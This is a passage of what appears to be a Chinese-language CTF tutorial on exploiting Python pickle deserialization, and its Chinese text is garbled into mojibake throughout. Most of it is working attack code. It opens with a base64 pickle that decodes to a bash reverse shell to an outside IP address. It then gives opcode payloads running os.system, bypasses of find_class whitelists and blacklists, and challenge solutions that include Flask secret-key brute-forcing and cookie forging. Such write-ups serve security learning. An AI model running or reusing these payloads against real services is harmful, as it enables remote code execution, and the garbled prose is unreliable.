base64.b64encode(pickle_a)print(encoded_data)#gASVbwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxTX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJy9iaW4vYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MS4xMy43Ni81NTU1IDA+JjEiJymUhZRSlC4= opcodeå¯ä»¥è°ƒç”¨å‡½æ•°çš„æ“ä½œç ï¼š R é€‰æ‹©æ ˆä¸Šçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ã€ç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆç¬¬äºŒä¸ªå¯¹è±¡å¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•° 1234opcode=b'''cossystem(S'whoami'tR.''' i ç›¸å½“äºcå’Œoçš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åå¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ 1234opcode=b'''(S'whoami'iossystem.''' o å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ 1234opcode=b'''(cossystemS'whoami'o.''' b+__setstate__() bæ“ä½œç å¯¹åº”çš„æ˜¯load_buildå‡½æ•°; ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ªå±æ€§å: å±æ€§å€¼çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½® æºç ï¼š 1234567891011121314151617181920212223242526272829303132def load_build(self): stack = self.stack state = stack.pop() # è·å–æ ˆçš„å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ èµ‹å€¼ç»™inst inst = stack[-1] # è·å–instå¯¹è±¡çš„__setstate__å±æ€§ setstate = getattr(inst, &quot;__setstate__&quot;, None) if setstate is not None: #æ£€æŸ¥æ˜¯å¦å­˜åœ¨ __setstate__ æ–¹æ³• ä¸€èˆ¬æ˜¯ä¸å­˜åœ¨çš„ ############################################### setstate(state) ###########ä¼šé€ æˆä»»æ„å‡½æ•°è°ƒç”¨ // ############################################ return slotstate = None # å¦‚æœstateæ˜¯å…ƒç»„ç±»å‹å¹¶ä¸”é•¿åº¦ä¸º2ï¼Œå°†å…¶åˆ†è§£ä¸ºstateå’Œslotstate if isinstance(state, tuple) and len(state) == 2: state, slotstate = state ##å¦‚æœ&quot;__setstate__&quot;ä¸ºç©ºï¼Œåˆ™stateä¸å¯¹è±¡é»˜è®¤çš„__dict__åˆå¹¶ï¼Œè¿™ä¸€æ­¥å…¶å®å°±æ˜¯å°†åºåˆ—åŒ–å‰ä¿å­˜çš„æŒä¹…åŒ–å±æ€§å’Œå¯¹è±¡å±æ€§å­—å…¸åˆå¹¶ if state: inst_dict = inst.__dict__ intern = sys.intern # éå†stateå­—å…¸ï¼Œå°†é”®åinternåèµ‹å€¼ç»™inst_dictï¼Œé”®å€¼ç›´æ¥èµ‹å€¼ for k, v in state.items(): if type(k) is str: inst_dict[intern(k)] = v else: inst_dict[k] = v # å¦‚æœslotstateä¸ä¸ºç©ºï¼Œéå†slotstateå­—å…¸ï¼Œå¹¶å°†å…¶é”®å€¼å¯¹èµ‹å€¼ç»™instå¯¹è±¡ if slotstate: for k, v in slotstate.items(): setattr(inst, k, v)dispatch[BUILD[0]] = load_build 1__setstate__ ï¼š å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œå¦‚æœæƒ³è¦å­˜å‚¨å¯¹è±¡çš„çŠ¶æ€ï¼Œå°±å¯ä»¥ä½¿ç”¨__getstat__å’Œ__setstat__æ–¹æ³•ã€‚ç”±äº pickle åŒæ ·å¯ä»¥å­˜å‚¨å¯¹è±¡å±æ€§çš„çŠ¶æ€ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¸»è¦æ˜¯é’ˆå¯¹é‚£äº›ä¸å¯è¢«åºåˆ—åŒ–çš„çŠ¶æ€ï¼Œå¦‚ä¸€ä¸ªè¢«æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„open(file,'r')ã€‚ å’Œä»–æˆå¯¹çš„è¿˜æœ‰ __getstate__ ï¼Œè¢«ååºåˆ—åŒ–æ—¶è°ƒç”¨__setstate__ï¼Œè¢«åºåˆ—åŒ–æ—¶è°ƒç”¨__getstate__ã€‚é‡å†™æ—¶å¯ä»¥çœç•¥__setstate__ï¼Œä½†__getstate__å¿…é¡»è¿”å›ä¸€ä¸ªå­—å…¸ã€‚å¦‚æœ__getstate__ä¸__setstate__éƒ½è¢«çœç•¥, é‚£ä¹ˆå°±é»˜è®¤è‡ªåŠ¨ä¿å­˜å’ŒåŠ è½½å¯¹è±¡çš„å±æ€§å­—å…¸__dict__ã€‚ ç›®çš„ï¼š 1å½“å‰å¯¹è±¡å­˜åœ¨å±æ€§'__setstate__'ï¼Œå¹¶ä¸”{'__setstate__': os.system} ç¬¬ä¸€ç§æ¥è‡ªå‚è€ƒä¸­çš„åšå®¢ï¼› 123456789101112131415161718192021222324import pickleclass Person: def __init__(self,age): self.age=ageopcode=b'''(c__main__PersonI18o}(S&quot;__setstate__&quot;cossystemubS&quot;whoami&quot;b.'''p=pickle.loads(opcode)#whoami# o å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARK,ä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®(å¿…é¡»ä¸ºå‡½æ•°)ä¸ºcallableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬nä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰# u å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARK,ç»„åˆä¹‹é—´çš„æ•°æ®(æ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ª,å³å‘ˆkey-value)å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ (å¿…é¡»ä¸ºå­—å…¸)ä¸­#æˆ‘æŠŠä»–ç¿»è¯‘æˆäººå¯ä»¥çœ‹æ‡‚çš„äº†ã€‚å¦‚ä¸‹# __import__(&quot;__main__&quot;).Person(18).__setstate__ = __import__('os')#ä½†æ˜¯å¯ä»¥çœ‹åˆ°è¿˜æ˜¯ç”¨åˆ°äº†oæ“ä½œç  æˆ‘è‡ªå·±æ ¹æ®ä¸Šä¸€ä¸ªpayloadï¼Œè¿›è¡Œäº†ä¸€ç‚¹æ”¹é€ ï¼›åˆ©ç”¨\\x81è¿”å›ä¸€ä¸ªPersonå¯¹è±¡ï¼›è¿™æ ·å°±ä¸éœ€è¦ç”¨åˆ°oæ“ä½œç äº†ï¼›\\x81åœ¨opcodeæºç åˆ†ææœ‰è¯¦ç»†è®² 123456789101112131415import pickleclass Person: def __init__(self,age): self.age=ageopcode=b'''c__main__Person)\\x81}(S&quot;__setstate__&quot;cossystemubS&quot;whoami&quot;b.'''p=pickle.loads(opcode) å…¶å®æˆ‘è¿˜åœ¨ä¸€ç¯‡åšå®¢ä¸­çœ‹åˆ°å¦ä¸€ç§åŠæ³•ï¼Œåªä¸è¿‡å¯¹äºåˆå­¦è€…çš„æˆ‘æ¥è¯´ï¼Œå¹¶æ²¡æœ‰å®Œå…¨çœ‹æ‡‚ï¼Œå…ˆè®°å½•ä¸‹æ¥ 123456789101112131415opcode=b'''c__main__Person)\\x81}X\\x0C\\x00\\x00\\x00__setstate__cossystemsbX\\x06\\x00\\x00\\x00whoamib.'''#å­—ç¬¦cï¼Œå¾€åè¯»å–ä¸¤è¡Œï¼Œå¾—åˆ°ä¸»å‡½æ•°å’Œç±»ï¼Œ__main__.tttang#å­—ç¬¦)ï¼Œå‘æ ˆä¸­å‹å…¥ç©ºå…ƒç¥–()#å­—ç¬¦}ï¼Œå‘æ ˆä¸­å‹å…¥ç©ºå­—å…¸{}#å­—ç¬¦Xï¼Œè¯»å–å››ä½\\x0C\\x00\\x00\\x00__setstate__,å¾—åˆ°__setstate__#å­—ç¬¦cï¼Œå‘åè¯»å–ä¸¤è¡Œï¼Œå¾—åˆ°å‡½æ•°os.system#å­—ç¬¦sï¼Œå°†ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå…ƒç´ ä½œä¸ºé”®å€¼å¯¹ï¼Œæ·»åŠ åˆ°ç¬¬ä¸‰ä¸ªå…ƒç´ ä¸­ï¼Œæ­¤æ—¶ä¹Ÿå°±æ˜¯{__main.tttang:()}ï¼Œ__setstate__,os.system#å­—ç¬¦bï¼Œç¬¬ä¸€ä¸ªå…ƒç´ å‡ºæ ˆï¼Œæ­¤æ—¶ä¹Ÿå°±æ˜¯{'__setstate__': os.system},æ­¤æ—¶æ‰§è¡Œä¸€æ¬¡setstate(state)#å­—ç¬¦Xï¼Œå¾€åè¯»å–å››ä½x06\\x00\\x00\\x00whoamiï¼Œå³whoami#å­—ç¬¦bï¼Œå¼¹å‡ºå…ƒç´ whoamiæ­¤æ—¶stateä¸ºwhoamiï¼Œæ‰§è¡Œos.system(whoami)#å­—ç¬¦.ï¼Œç»“æŸååºåˆ—åŒ– å½“ç„¶ï¼Œæ€è·¯æ˜¯å¤©é©¬è¡Œç©ºçš„ï¼Œåˆ©ç”¨bæ“ä½œç æ‰§è¡Œå‘½ä»¤è‚¯å®šä¸æ­¢è¿™å‡ ç§payloadï¼› \\x81 æˆ‘ä¸ªäººæ„Ÿè§‰\\x81æ“ä½œç ï¼Œåœ¨å¯¼å…¥å±é™©æ¨¡å—(æ¯”å¦‚builtins)æƒ…å†µä¸‹ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨ 123456789101112131415161718192021222324import pickleimport builtinsopcode=b'''c__builtin__mapp00(S'whoami'tp10(cossystemg1tp20g0g2\\x81p30c__builtin__bytesp4(g3t\\x81.'''pickle.loads(opcode)#__import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))) å˜é‡è¦†ç›–__reduce__12345678910111213import picklekey1 = b'321'key2 = b'123'class zIxyd(object): def __reduce__(self): return (exec,(&quot;key1=b'1'\\nkey2=b'2'&quot;,))payload = zIxyd()pickle_a = pickle.dumps(payload)print(pickle_a)pickle.loads(pickle_a)print(key1, key2) opcode12#secret.pyname = &quot;zIxyd&quot; 123456789101112131415#test.pyimport pickleimport secretprint(&quot;secret:&quot;+secret.name)opcode=b'''c__main__secret(S'name'S'Hacker'db.'''result = pickle.loads(opcode)print(result.name)#secret:zIxyd#Hacker å®ä¾‹åŒ–å¯¹è±¡å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œï¼Œè¿™é‡Œç®€å•çš„ä½¿ç”¨ R æ„é€ ä¸€ä¸‹ï¼Œå…¶ä»–æ–¹å¼ç±»ä¼¼ï¼š 123456789101112131415# coding=utf-8import pickleclass Student: def __init__(self, name, age): self.name = name self.age = agedata=b'''c__main__Student(S'XiaoMing'S&quot;20&quot;tR.'''a=pickle.loads(data)print(a.name,a.age) pickle.Unpickler.find_class()ç”±äºå®˜æ–¹é’ˆå¯¹pickleçš„å®‰å…¨é—®é¢˜çš„å»ºè®®æ˜¯ä¿®æ”¹find_class()ï¼Œå¼•å…¥ç™½åå•çš„æ–¹å¼æ¥è§£å†³ï¼Œå¾ˆå¤šCTFé¢˜éƒ½æ˜¯é’ˆå¯¹è¯¥å‡½æ•°è¿›è¡Œï¼Œæ‰€ä»¥ææ¸…æ¥šå¦‚ä½•ç»•è¿‡è¯¥å‡½æ•°å¾ˆé‡è¦ã€‚ä»€ä¹ˆæ—¶å€™ä¼šè°ƒç”¨find_class()ï¼š ä»opcodeè§’åº¦çœ‹ï¼Œå½“å‡ºç°cã€iã€b'\\x93'æ—¶ï¼Œä¼šè°ƒç”¨ï¼Œæ‰€ä»¥åªè¦åœ¨è¿™ä¸‰ä¸ªopcodeç›´æ¥å¼•å…¥æ¨¡å—æ—¶æ²¡æœ‰è¿åè§„åˆ™å³å¯ã€‚ ä»pythonä»£ç æ¥çœ‹ï¼Œfind_class()åªä¼šåœ¨è§£æopcodeæ—¶è°ƒç”¨ä¸€æ¬¡ï¼Œæ‰€ä»¥åªè¦ç»•è¿‡opcodeæ‰§è¡Œè¿‡ç¨‹ï¼Œfind_class()å°±ä¸ä¼šå†è°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´find_class()åªéœ€è¦è¿‡ä¸€æ¬¡ï¼Œé€šè¿‡ä¹‹åå†äº§ç”Ÿçš„å‡½æ•°åœ¨é»‘åå•ä¸­ä¹Ÿä¸ä¼šæ‹¦æˆªï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡__import__ç»•è¿‡ä¸€äº›é»‘åå•ã€‚ ä¸‹é¢å…ˆçœ‹ä¸¤ä¸ªä¾‹å­ï¼š 12345678910safe_builtins = {'range','complex','set','frozenset','slice',}class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes from builtins. if module == &quot;builtins&quot; and name in safe_builtins: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; %(module, name)) 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # åªå…è®¸__main__æ¨¡å— return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) ç¬¬ä¸€ä¸ªä¾‹å­æ˜¯å®˜æ–¹æ–‡æ¡£ä¸­çš„ä¾‹å­ï¼Œä½¿ç”¨ç™½åå•é™åˆ¶äº†èƒ½å¤Ÿè°ƒç”¨çš„æ¨¡å—ä¸º{'range','complex','set','frozenset','slice',}ã€‚ ç¬¬äºŒä¸ªä¾‹å­æ˜¯é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›Â·webtmpä¸­çš„è¿‡æ»¤æ–¹æ³•ï¼Œåªå…è®¸__main__æ¨¡å—ã€‚è™½ç„¶çœ‹èµ·æ¥å¾ˆå®‰å…¨ï¼Œä½†æ˜¯è¢«å¼•å…¥ä¸»ç¨‹åºçš„æ¨¡å—éƒ½å¯ä»¥é€šè¿‡__main__è°ƒç”¨ä¿®æ”¹ï¼Œæ‰€ä»¥é€ æˆäº†å˜é‡è¦†ç›–ã€‚ ç”±è¿™ä¸¤ä¸ªä¾‹å­æˆ‘ä»¬äº†è§£åˆ°ï¼Œå¯¹äºå¼€å‘è€…è€Œè¨€ï¼Œä½¿ç”¨ç™½åå•è°¨æ…åˆ—å‡ºå®‰å…¨çš„æ¨¡å—åˆ™æ˜¯è§„é¿å®‰å…¨é—®é¢˜çš„æ–¹æ³•ï¼›è€Œå¦‚ä½•ç»•è¿‡find_classå‡½æ•°å†…çš„é™åˆ¶å°±æ˜¯pickleååºåˆ—åŒ–è§£é¢˜çš„å…³é”®ã€‚æ­¤å¤–ï¼ŒCTFä¸­çš„è€ƒå¯Ÿç‚¹å¾€å¾€è¿˜ä¼šç»“åˆpythonçš„åŸºç¡€çŸ¥è¯†ï¼ˆå¾€å¾€æ˜¯å†…ç½®çš„æ¨¡å—ã€å±æ€§ã€å‡½æ•°ï¼‰è¿›è¡Œï¼Œè€ƒå¯Ÿå¯¹ç™½åå•æ¨¡å—çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œæ‰€ä»¥åšé¢˜çš„æ—¶å€™å¯ä»¥å…ˆæŠŠç™½åå•æ¨¡å—çš„æ–‡æ¡£çœ‹ä¸€çœ‹:) CTFå®æˆ˜Code-Breaking:picklecodeé¢˜ç›®å°†pickleèƒ½å¤Ÿå¼•å…¥çš„æ¨¡å—é™å®šä¸ºbuiltinsï¼Œå¹¶ä¸”è®¾ç½®äº†å­æ¨¡å—é»‘åå•ï¼š{'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}ï¼Œäºæ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥åˆ©ç”¨çš„æ¨¡å—æœ‰ï¼š builtinsæ¨¡å—ä¸­ï¼Œé»‘åå•å¤–çš„å­æ¨¡å—ã€‚ å·²ç»importçš„æ¨¡å—ï¼šioã€builtinsï¼ˆéœ€è¦å…ˆåˆ©ç”¨builtinsæ¨¡å—ä¸­çš„å‡½æ•°ï¼‰ é»‘åå•ä¸­æ²¡æœ‰getattrï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡getattrè·å–ioæˆ–builtinsçš„å­æ¨¡å—ä»¥åŠå­æ¨¡å—çš„å­æ¨¡å—:)ï¼Œè€Œbuiltinsé‡Œæœ‰evalã€execç­‰å±é™©å‡½æ•°ï¼Œå³ä½¿åœ¨é»‘åå•ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡getattrè·å¾—ã€‚pickleä¸èƒ½ç›´æ¥è·å–builtinsä¸€çº§æ¨¡å—ï¼Œä½†å¯ä»¥é€šè¿‡builtins.globals()è·å¾—builtinsï¼›è¿™æ ·å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚payloadä¸ºï¼š 1234567891011121314151617181920212223import builtinsimport picklepayload=b&quot;&quot;&quot;cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__(&quot;os&quot;).system(&quot;whoami&quot;)'tR.&quot;&quot;&quot;pickle.loads(payload)#ç¿»è¯‘æˆäººå¯ä»¥çœ‹æ‡‚çš„(æäº†å‡ ååˆ†é’Ÿæ‰ç¿»è¯‘å‡ºæ¥)# builtins.getattr(builtins.getattr(builtins.dict,'get')(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)('__import__(&quot;os&quot;).system(&quot;whoami&quot;)') é¦–å…ˆæ‰§è¡Œgetattrè·å–evalå‡½æ•°ï¼Œå†æ‰§è¡Œevalå‡½æ•°ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸¤æ­¥ï¼Œè€Œæˆ‘ä»¬å¸¸ç”¨__reduce__ç”Ÿæˆçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œåªèƒ½æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼›æ‰€ä»¥è¿™é¢˜åªèƒ½æ“opcodeï¼›è¿™é¢˜æ›´å¤šç»†èŠ‚å¯ä»¥çœ‹pç¥ é«˜æ ¡æˆ˜ç–«ç½‘ç»œå®‰å…¨åˆ†äº«èµ›:webtmpé™åˆ¶ï¼šé‡å†™äº†find_classå‡½æ•°ï¼Œåªèƒ½ç”Ÿæˆ__main__æ¨¡å—çš„pickleï¼š 12345class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': # åªå…è®¸__main__æ¨¡å— return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name)) æ­¤å¤–ï¼Œç¦æ­¢äº†b'R'ï¼š 1234try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' ç›®æ ‡æ˜¯è¦†ç›–secretä¸­çš„éªŒè¯ï¼Œç”±äºsecretè¢«ä¸»ç¨‹åºå¼•å…¥ï¼Œæ˜¯å­˜åœ¨äº__main__ä¸‹çš„secretæ¨¡å—ä¸­çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¦†ç›–æ‰ï¼Œæ­¤æ—¶å°±æˆåŠŸç»•è¿‡äº†é™åˆ¶ï¼š 1234567891011b'''c__main__secret(S'name'S&quot;1&quot;S&quot;category&quot;S&quot;2&quot;db0(S&quot;1&quot;S&quot;2&quot;i__main__Animal.''' ä¹Ÿå°±æ˜¯ä¿®æ”¹secretä¸­çš„å†…å®¹ï¼Œå†ä¿®æ”¹Animalä¸­çš„å†…å®¹ [MTCTF 2022]easypickle12345678910111213141516171819202122232425262728293031323334import base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != &quot;admin&quot;: return f&quot;&lt;script&gt;alert('Access Denied');window.location.href='/'&lt;/script&gt;&quot; else: try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; except: return &quot;error!&quot;if __name__ == '__main__': app.run(host='0.0.0.0', port=8888) çˆ†ç ´å‡ºsecret-key 1234567import osfile_path='./key.txt'with open(file_path, 'w') as f: for i in range(1,99999): key = os.urandom(2).hex() f.write(&quot;\\&quot;{}\\&quot;\\n&quot;.format(key)) 123pip install flask-unsignflask-unsign --unsign --cookie &quot;eyJ1c2VyIjoiYWRuZGEifQ.ZcCoiA.4j5NXD8o0aO7M1_QlzclCXimORo&quot; --wordlist key.txtpython3 flask_session_cookie_manager3.py encode -s &quot;23a2&quot; -t &quot;{'username':'admin'}&quot; è¿™é‡Œä¸»è¦çœ‹pickle 123456try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; ç®—æ˜¯é€»è¾‘æ¼æ´å§ payload éå¸¸å·§å¦™ï¼›åˆ©ç”¨replace(b&quot;os&quot;, b&quot;Os&quot;)ç»•è¿‡å¯¹oæ“ä½œç çš„é™åˆ¶ï¼› 1b'''(S'key1'\\nS'val1'\\ndS'vul'\\n(cos\\nsystem\\nVcalc\\nos.''' ä½†æ˜¯æˆ‘æ„Ÿè§‰é¢„æœŸè§£çš„payloadåº”è¯¥æ˜¯ä¸‹é¢ä¸¤è¿™ç§ï¼Œåˆ©ç”¨\\81æ“ä½œç  1234567891011121314151617181920212223242526272829import pickleimport builtinsopcode=b'''c__builtin__mapp00(S'whoami'tp10(cossystemg1tp20g0g2\\x81p30c__builtin__bytesp4(g3t\\x81.'''pickle.loads(opcode)# p0 __import__(&quot;builtins&quot;).map# p1 ('whoami',)# p2 os.system,('whoami',)# p3 __import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))# p4 __import__(&quot;builtins&quot;).bytes# . __import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,('whoami',))) ä¸‹é¢è¿™ç§paylaodè¿˜å¿…é¡»å½“å‰æ–‡ä»¶å¯¼å…¥osæ¨¡å—æ‰è¡Œ 1234567891011121314151617181920212223242526import pickleimport builtinsimport osopcode = b'''c__builtin__mapp00(S'os.system(&quot;whoami&quot;)'tp10(c__builtin__execg1tp2g0g2\\x81p30c__builtin__bytesp40(g3tp30g4g3\\x81.'''pickle.loads(opcode)#__import__(&quot;builtins&quot;).bytes(__import__(&quot;builtins&quot;).map(__import__(&quot;builtins&quot;).exec,('os.system(&quot;whoami&quot;)',))) pkerä½¿ç”¨è¯´æ˜ç®€ä»‹ pkeræ˜¯ç”±@eddieivan01ç¼–å†™çš„ä»¥ä»¿ç…§Pythonçš„å½¢å¼äº§ç”Ÿpickle opcodeçš„è§£æå™¨ï¼Œå¯ä»¥åœ¨https://github.com/eddieivan01/pkerä¸‹è½½æºç ã€‚ ä½¿ç”¨pkerï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ–¹ä¾¿åœ°ç¼–å†™pickle opcodeï¼ˆç”Ÿæˆpickleç‰ˆæœ¬0çš„opcodeï¼‰ã€‚ å†æ¬¡å»ºè®®ï¼Œåœ¨èƒ½å¤Ÿæ‰‹å†™opcodeçš„æƒ…å†µä¸‹ä½¿ç”¨pkerè¿›è¡Œè¾…åŠ©ç¼–å†™ï¼Œä¸è¦è¿‡åˆ†ä¾èµ–pkerã€‚ æ­¤å¤–ï¼Œpkerçš„å®ç°ç”¨åˆ°äº†pythonçš„astï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰åº“ï¼ŒæŠ½è±¡è¯­æ³•æ ‘ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦ä¸œè¥¿ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ç ”ç©¶ä¸€ä¸‹aståº“å’Œpkerçš„æºç ï¼Œç”±äºç¯‡å¹…é™åˆ¶ï¼Œè¿™é‡Œä¸å†å™è¿°ã€‚ å…·ä½“æ¥è®²ï¼Œå¯ä»¥ä½¿ç”¨pkerè¿›è¡ŒåŸå˜é‡è¦†ç›–ã€å‡½æ•°æ‰§è¡Œã€å®ä¾‹åŒ–æ–°çš„å¯¹è±¡ã€‚ ä½¿ç”¨æ–¹æ³•ä¸ç¤ºä¾‹ pkerä¸­çš„é’ˆå¯¹pickleçš„ç‰¹æ®Šè¯­æ³•éœ€è¦é‡ç‚¹æŒæ¡ï¼ˆåæ–‡ç»™å‡ºç¤ºä¾‹ï¼‰ æ­¤å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼špythonä¸­çš„æ‰€æœ‰ç±»ã€æ¨¡å—ã€åŒ…ã€å±æ€§ç­‰éƒ½æ˜¯å¯¹è±¡ï¼Œè¿™æ ·ä¾¿äºå¯¹å„æ“ä½œè¿›è¡Œç†è§£ã€‚ pkerä¸»è¦ç”¨åˆ°GLOBALã€INSTã€OBJä¸‰ç§ç‰¹æ®Šçš„å‡½æ•°ä»¥åŠä¸€äº›å¿…è¦çš„è½¬æ¢æ–¹å¼ï¼Œå…¶ä»–çš„opcodeä¹Ÿå¯ä»¥æ‰‹åŠ¨ä½¿ç”¨ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940ä»¥ä¸‹moduleéƒ½å¯ä»¥æ˜¯åŒ…å«`.`çš„å­moduleè°ƒç”¨å‡½æ•°æ—¶ï¼Œæ³¨æ„ä¼ å…¥çš„å‚æ•°ç±»å‹è¦å’Œç¤ºä¾‹ä¸€è‡´å¯¹åº”çš„opcodeä¼šè¢«ç”Ÿæˆï¼Œä½†å¹¶ä¸ä¸pkerä»£ç ç›¸äº’ç­‰ä»·GLOBALå¯¹åº”opcodeï¼šb'c'è·å–moduleä¸‹çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡ï¼ˆæ²¡æœ‰importçš„ä¹Ÿå¯ä»¥ï¼Œæ¯”å¦‚ä¸‹é¢çš„osï¼‰ï¼šGLOBAL('os', 'system')è¾“å…¥ï¼šmodule,instance(callableã€moduleéƒ½æ˜¯instance) INSTå¯¹åº”opcodeï¼šb'i'å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼šINST('os', 'system', 'ls') è¾“å…¥ï¼šmodule,callable,para OBJå¯¹åº”opcodeï¼šb'o'å»ºç«‹å¹¶å…¥æ ˆä¸€ä¸ªå¯¹è±¡ï¼ˆä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºcallableï¼Œå¯ä»¥æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼‰ï¼‰ï¼šOBJ(GLOBAL('os', 'system'), 'ls') è¾“å…¥ï¼šcallable,paraxxx(xx,...)å¯¹åº”opcodeï¼šb'R'ä½¿ç”¨å‚æ•°xxè°ƒç”¨å‡½æ•°xxxï¼ˆå…ˆå°†å‡½æ•°å…¥æ ˆï¼Œå†å°†å‚æ•°å…¥æ 